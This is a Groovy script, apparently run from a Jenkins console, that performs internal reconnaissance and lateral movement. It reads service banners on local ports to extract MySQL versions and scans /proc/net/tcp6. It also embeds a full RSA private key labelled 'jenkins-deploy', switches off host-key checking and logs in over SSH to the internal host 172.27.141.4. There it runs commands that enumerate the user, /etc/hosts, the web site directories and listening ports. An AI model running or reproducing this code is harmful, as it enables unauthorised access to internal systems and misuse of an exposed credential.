// Lee banners de puertos locales MySQL y SSH via JSch RAPIDO

println "=== LOCAL PORT BANNERS ==="
[13306, 13307, 13308, 23456].each { port ->
    try {
        def socket = new Socket("127.0.0.1", port)
        socket.soTimeout = 3000
        def stream = socket.inputStream
        def banner = new byte[300]
        def len = stream.read(banner, 0, 300)
        socket.close()
        if (len > 0) {
            def bannerHex = banner[0..<len].collect { String.format("%02X", it & 0xFF) }.join(" ")
            def bannerStr = new String(banner, 0, len).replaceAll('[^\\x20-\\x7E]', '.')
            println "PORT ${port}: ${bannerStr.take(200)}"
            
            // MySQL version extraction
            if (len > 10 && (banner[4] & 0xFF) == 10) { // MySQL greeting packet, protocol 10
                def versionEnd = -1
                for (int i = 5; i < Math.min(50, len); i++) {
                    if (banner[i] == 0) { versionEnd = i; break }
                }
                if (versionEnd > 5) {
                    println "  >> MySQL version: ${new String(banner, 5, versionEnd - 5)}"
                }
            }
        }
    } catch(e) {
        println "PORT ${port}: ${e.message}"
    }
}

println "\n=== JSch SSH QUICK (1 target) ==="
try {
    def jsch = new com.jcraft.jsch.JSch()
    def keyBytes = """-----BEGIN RSA PRIVATE KEY-----
MIIEowIBAAKCAQEApeSSUiBjXCxjR9bWb90AUJ0SbLANv030lZvUY2Bc7a4VZPXc
gfvTSAmIvMiNiEPR/+hsrUhHtDtz55JqtKzk4jBxBUUFcaIreqOmKyxv3hCEmMAu
FLPiFTdiIkDs3Wpu+6JNney6PLuxOlffhA4zuS4JpNZfZz1EeEC3AIK3zLLbSp9Y
8EFJ4oO8QAZ65n4dS/f/G+U/qckJjv9pCB/c64hun3h4Ilw34Bx24q4jOTTy1HHz
AzWEGhjBLZqaNf+mxDTulXy3LCi5esPE4ILjoXFHrPD2t9hF1h6JqRUjNbsP+AMt
mFUyShPBoWEy/t/8Z4CislFQHtRyMIScbo4QywIBIwKCAQEAoScvDfOTuKAl7gPm
QMgO7zl/nMhH3mj8OZAQJgXWnb8NeATHlDZ1eS3VSazhQosGg5FToQRi6ZjW/jZ2
SRz7meXqImBObmMFqlXUnvf3pIUTGAslczJmmERt9WOkRM3K5dDdr1r+Dxy6yvZG
2A3L2HXde45rTljGK6yUhCc2NI7sr9UFoTMZ6Tzjrk8OhWdLUxDtQVwwpacDwahW
XbaV5B+vnqS2MTBJ61jZpCVRl504NFO2rg2O1Lg3E8CgzLDY7A159gAG5xKaiVM3
6JUBp377x0OJNhCunPI0q/UoyGvf5VJwjoLflTbZqrQl2FpNA7FFiLa9eJqsWYJV
8LNliwKBgQDUc0bi+0M3ByuMFqRgCAIr7mv6KTA5kF08cVQNIzL5bAO3n+ejIKRf
RFBmjKUGAuz6v4FgE8pX892IUSt/fOzd/g4Z4nYuntmOSHmsStwWyNhfobbR0c9O
bJnxjtCFI1mjBDSkJYVZ0MQvQ9sgDIvAH4sVq3sWgDtdILPPI5opSwKBgQDH5htK
g8Hwp3tj5uOL677JePqYPnvE9m0NA34SC/w6I75zJ4zsR42qof+ow6Z2ZYB6dal1
AALc4dfxGuyTT8YltQnmNcpFNgdP4Skiy+A8FZYwJ4OuPXBDqdaPDuZdgEy7LWMV
lNCnBVrfeRfr/QZWac4fzOzvC9u9/vfPLYaGgQKBgQDOYVrN3iQJke/J6hwFhB9d
4EuijmlcfZxmmfng4F1nUvxL+mv9jWx5zVVq7wa1Ye2F3prvnjJGz6QAw+Ecwn+z
FA2yvrvyxjJs9fKKHNXM/Z790EsyOYeOAxkzzJAMTjnRjw6Q0/3iOIQQqFE1E4Bx
fbpPkKN08ZjA3fCAE/TXpwKBgQDCL/1BEkdezpUfOBA+x8CmdYW4dzZnkEytjl02
GkV6TpvAUk5h3xvnlg5MK8ZHIMXzTbqO6hFo22QOybKduzWDty4wFv8BZ69U6Vsp
HdKDgq8ndtewk3Re/MHMzKVE4wi11FGf76Yel3zZFoxEVOGVxd4thT3vh9zHMjKO
voKuiwKBgFZ4LHsqhnU/o7DBdV6FB67pWtrVCZNGNf30Swd9PFzGJbSCXRKJ9Iwd
jYqClYgkyxylo5H6Nzl0Y7wGqKoGBWMIOvpkG0mrSOYMB0iGwXnWS1g94xeRw32k
CtOrnvIVC8SKdmm5H+uzoN+WpSwC+oRkS7cIGjzthuw7omygk1ng
-----END RSA PRIVATE KEY-----""".bytes
    
    jsch.addIdentity("jenkins-deploy", keyBytes, null, "".bytes)
    jsch.setConfig("StrictHostKeyChecking", "no")
    jsch.setConfig("PreferredAuthentications", "publickey,password")
    
    // Try CSDEV01-2 (172.27.141.4) - it's REACHABLE
    def session = jsch.getSession("jenkins", "172.27.141.4", 22)
    session.setConfig("StrictHostKeyChecking", "no")
    session.connect(5000)
    println "CONNECTED to jenkins@172.27.141.4 via JSch!"
    
    def channel = session.openChannel("exec")
    ((com.jcraft.jsch.ChannelExec)channel).command = "id && hostname && cat /etc/hosts && ls /var/www/sites/ 2>/dev/null | head -20 && netstat -tuln 2>/dev/null | grep LISTEN"
    channel.connect()
    
    Thread.sleep(3000)
    def output = new String(channel.inputStream.bytes)
    def stderr = new String(((com.jcraft.jsch.ChannelExec)channel).errStream.bytes)
    
    println "SSH OUTPUT:\n${output.take(3000)}"
    if (stderr.trim()) println "SSH STDERR:\n${stderr.take(500)}"
    
    channel.disconnect()
    session.disconnect()
    
} catch(e) {
    println "JSch error: ${e.class.simpleName}: ${e.message?.take(200)}"
}

println "\n=== /proc/net/tcp6 CONNECTIONS ==="
try {
    def tcpFile = new File("/proc/net/tcp6")
    if (tcpFile.exists()) {
        // Convert port to hex
        def hexPorts = [13306, 13307, 13308, 23456].collect { String.format("%04X", it).toUpperCase() }
        println "Looking for ports: ${hexPorts}"
        tcpFile.text.split("\n").each { line ->
            hexPorts.each { hp ->
                if (line.contains(":${hp} ") || line.contains(":${hp}\t")) {
                    println "  ${line.trim()}"
                }
            }
        }
    }
} catch(e) {
    println "/proc/net/tcp6: ${e.message}"
}
